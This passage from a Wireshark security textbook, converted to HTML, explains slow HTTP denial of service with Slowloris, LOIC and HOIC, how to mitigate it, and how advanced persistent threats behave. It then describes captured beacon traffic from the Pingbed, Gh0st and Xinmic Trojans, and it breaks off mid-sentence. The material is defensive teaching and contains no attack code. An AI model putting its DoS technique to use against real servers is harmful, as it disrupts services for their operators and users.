noisy ways to produce a denial of service. Exhausting resources </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >slowly </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >can just as effectively lead to service interruption as the fire hose tactic. With respect to the OSI model, instead of causing service interruption from a barrage of layer 2 or layer 3 traffic, an attacker</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >can interrupt service from the top-most</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >layer.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:10.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are too many ways to list how applications can fail. Consult the OWASP&#8217;s Top 10 vulnerabilities for a great start on how applications get exploited. A popular one is poor input validation. For example, the application accepts, albeit poorly, a 10MB file when it prompts for a 30-character name. And the application promptly fails.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To successfully bring down a server doesn&#8217;t even need the listening application to be ill equipped to handle badly formed or specially crafted traffic. Maybe a web server dies of resource starvation because of perfectly legitimate traffic. A very popular tool exploits a server that accepts connection requests but won&#8217;t proceed because the request is</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section223" ><p class=MsoBodyText  style="margin-top:4.0000pt;margin-right:10.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >not entirely complete, leaving the web server waiting. That&#8217;s the case with Slowloris, a patient and methodical DoS tool. Different tools relying on the same method include Low Orbit Ion Cannon (LOIC) and High Orbit Ion Cannon (HOIC). Both LOIC and HOIC utilize TCP and UDP as well as HTTP, all of which follow the same method:</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >slowly and systematically exhaust system resources by connection</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >request.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s a popular enough technique that you&#8217;re likely already aware of the tool genre: Slow HTTP DoS.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:6.3500pt;" ><a name="_bookmark435" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Slowloris opens a connection to the web server but doesn&#8217;t finish it, doing so many times. Similar to the SYN flood mentioned earlier, but with connecting to the web server, Slowloris can eat up more resources per connection. This allows Slowloris to avoid the obvious attention, and likely action taken to mitigate against it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Slowloris sends a complete packet but only a partial HTTP request. Not malformed, but a legitimate, partial request. That way, the intrusion detection systems or host security monitoring doesn&#8217;t flag it as malicious or even suspect.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Assuming a default timeout of 60 seconds, Slowloris will reopen its connections at 59 seconds, just before the connection would close. Throughout the time spent waiting, Slowloris just keeps sending partial connection requests.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.6500pt;margin-right:29.8500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Eventually, Slowloris reaches the maximum number of connections allowed by the web server, or at least causes the web server to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >reject incoming genuine connection</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >requests.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:15.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:19.5000pt;" >How to Prevent DoS Attacks</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For techniques used years ago, like the Smurf attack (ICMP broadcast storm), network administrators now know better how to stop or mitigate it. For techniques used more recently, like a malformed protocol or application data, system administrators can take a number of steps. For example, at a network level, the admin can employ filters or place an intrusion detection system (IDS) or intrusion prevention system (IPS). The system administrator can adjust configuration parameters of the affected application. The developer can harden code with security in mind. And, if the budget is justified, an admin could</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section224" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >employ a third-party solution to monitor and react.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:10.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >But how much of this works? Many of those examples would work well, given it&#8217;s the right reaction to the DoS they had. But who is to say that DoS will happen again? And if it does but fails, will the attackers not adjust and react as well? Even the most cutting edge third-party solutions are limited this way. Whether the expensive solution reacts to a known pattern or an anomaly, attackers will tweak, randomize, and adapt their delivery.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:9.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the case of Slowloris, there might be a sweet spot between the two web server parameters governing how long to wait before a connection is deemed inactive and how many concurrent connections it can handle. On Apache, those parameters are called KeepAliveTimeout and MaxKeepAliveRequests, while in Microsoft&#8217;s IIS they are connectionTimeout and maxConnections. As you should already suspect, the more practical sweet spot is really between having the server resources and the determination of the attacker.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Is all hope lost? Of course not, but it&#8217;s tough. At best, this is a cat-and- mouse game of techniques and defenses. New defense techniques get learned and new defense systems are developed. Then, the innovative attacker shifts attention to the systems and protocols still used and finds a way to exploit them instead. That is the &#8220;at best&#8221; scenario. At worst, preventing a DoS is impossible. In the <a name="_bookmark436" ></a>big picture, whatever protocol or channel that&#8217;s open for communication is a protocol and channel open to getting occupied or terminated. It&#8217;s only the details in implementation that shift and adapt.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark437" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Attack Type: Advanced Persistent Threat" ></a>Attack Type: Advanced Persistent Threat</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:8.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The APT is arguably the most capable and most feared of all threats. There&#8217;s no fame or recognition for those behind an APT. In fact, if you&#8217;ve heard news on cyber-espionage, there is only shame and political blowback from being discovered. This all probably sounds dramatic, but APT is a generalized category of the malware behavior (not the malware code itself) that security professionals especially hate to see. APT methods, behavior, and purpose are far different from what we&#8217;ve seen so far. To describe the APT, maybe it is best to</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section225" ><p class=MsoBodyText  style="margin-top:3.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >compare it to what we&#8217;ve already seen.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Compared to the man-in-the-middle attack, an APT isn&#8217;t so restricted or temporary. The APT won&#8217;t position itself between two systems but instead burrow into a place that offers the best access to what it seeks: information. APT seeks access to as many, not one or two, critical systems as possible.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >And compared to the DoS, the APT is just the opposite. APT neither seeks attention nor wants to interrupt operations. The APT doesn&#8217;t want to be found and removed. An APT seeks to get into a protected network, plant itself for large-scale reconnaissance and gathering, and do so for the long haul.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The APT is the uninvited &#8220;wallflower&#8221; at the party that, when aptly commanded, turns into a cunning spy. (Yes, &#8220;aptly&#8221; used, full pun intended.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Why APT Attacks Are Effective</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >APT attacks work for two big reasons: smart stealth and people.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:8.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, look at the keywords: advanced and persistent. Advanced</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >alludes to the tradecraft: well-funded, not uncommon to be from nation-states or highly resourceful people accustomed to being, and staying, in power. And there are likely some pretty smart folks behind that coding. The other keyword, persistent, refers to the malware&#8217;s goal: keep out of sight. Persistent doesn&#8217;t mean &#8220;Get in and make as much noise as possible, so we get caught.&#8221; No, it means, get in and stay down, stay</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >quiet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:1.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The second main reason is because a company has users. Users allow, even enable and help APT attacks. That might sound cynical or jaded, but as security professionals, you likely agree that users are both a company&#8217;s greatest asset and most reliable attack vector. Security professionals try to educate and raise security awareness. We implement policies, lock down devices, and regularly poke and probe our environments for problems. These days, users might know <a name="_bookmark438" ></a>better than to insert a USB stick gifted from a conference. But still, people are still notoriously helpful and willing to bend rules for the sake of being</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section226" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >a decent human being.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >But we can&#8217;t just blame people for allowing this malware to come in. When it comes to attack types, the APT is arguably the most capable and most feared of all. If your company has something of value (don&#8217;t they all?), then your company is a target for someone.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >How APT Attacks Get Done</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:9.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As said earlier, APT is a category on behavior, not necessarily the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >code. The technical details how an APT gets into the network cannot be limited to one or two techniques. It&#8217;s more telling that an APT will get in, somehow. The reasons for why are spelled out already: once a target is identified, the threat actor is determined to get in, and will find a</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >way.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Whether it&#8217;s a phishing email or through social networking, sent by malicious file or exploiting an application vulnerability, it happens. Whatever path the APT uses to get into the protected network, that&#8217;s something to count on. If an environment is targeted by an APT attacker, then penetration is all but guaranteed by sheer will. The first step is dropping malware, likely a Trojan or remote access tool (RAT). But this doesn&#8217;t make it a successful breach yet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once the malware is in, reconnaissance starts, as the attacker</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >searches for valuable data or users. Malware might spread or replicate to facilitate the reconnaissance. Or the Trojan/RAT will work on behalf of an external</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >actor.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The APT will gather the data or research what it needs to accomplish some early goals. First, seek multiple, and more protected footholds into the network. Second, determine what needs to be gathered (likely somewhat known prior to the infiltration) and determine how to gather that data. Lastly, the person controlling the APT needs to funnel the data amassed internally to the outside. And that labels the breach a success.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Example APT Traffic in Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We don&#8217;t run Trojan backdoors or other APT malware droppers within</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section227" ><p class=MsoBodyText  style="margin-top:3.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the W4SP Lab. The risk of inadvertently releasing and propagating malware outside the lab is too great. Instead, we cover a few APT examples with screenshots of Wireshark. With each example, we point out notes from the traffic. The packet captures used for these examples were allowed for publication by Mila Parkour, the admin at Deepend research. Anyone may download the packet captures from a link on </span><span><a href="http://data.deependresearch.org/" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >http://data.deependresearch.org/</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The goal with these examples isn&#8217;t to establish a pattern as much as demonstrate diversity in these samples.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.7500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Example APT: Win32/Pingbed</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Microsoft&#8217;s <a name="_bookmark439" ></a>threat encyclopedia and others rated the Trojan dropper for Pingbed with the highest possible severity.<a name="_bookmark440" ></a>&nbsp;</span><span><a href="#_bookmark441" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-18</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is a screenshot of Wireshark showing traffic captured from Pingbed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="612"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker297411.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section228" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark441" ></a><span><a href="#_bookmark440" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-18:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Pingbed</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark442" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note the persistent calls to the remote IP via 80/tcp from the Trojaned system (10.0.0.23), the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >GET </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >method to retrieve default.htm, then the closed connection (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.6500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Example APT: Gh0st</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;" ><a name="_bookmark443" ></a><span><a href="#_bookmark444" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-19</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is a screenshot of Wireshark showing traffic captured from Gh0st.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="674"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker297767.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:9.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark444" ></a><span><a href="#_bookmark443" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-19:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Gh0st</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note the persistent calls to the remote IP via 80/tcp from the Trojaned system (172.16.253.130), the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >GET</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >method to retrieve </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >h.gif</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, then the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section229" ><p class=MsoBodyText  style="margin-top:4.3500pt;margin-right:10.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >closed connection (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag)&#8212;each connection from </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >timed to take 120 seconds.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Example APT: Xinmic</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoNormal  style="margin-top:7.8500pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This Trojan copies itself to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >c:\Documents and Settings\test user\Application Data\MicNs\updata.exe</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, dropping only two other files. Xinmic methodically starts to connect (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >), and acknowledges (</span><span style="mso-spacerun:'yes';font-family:'Courier 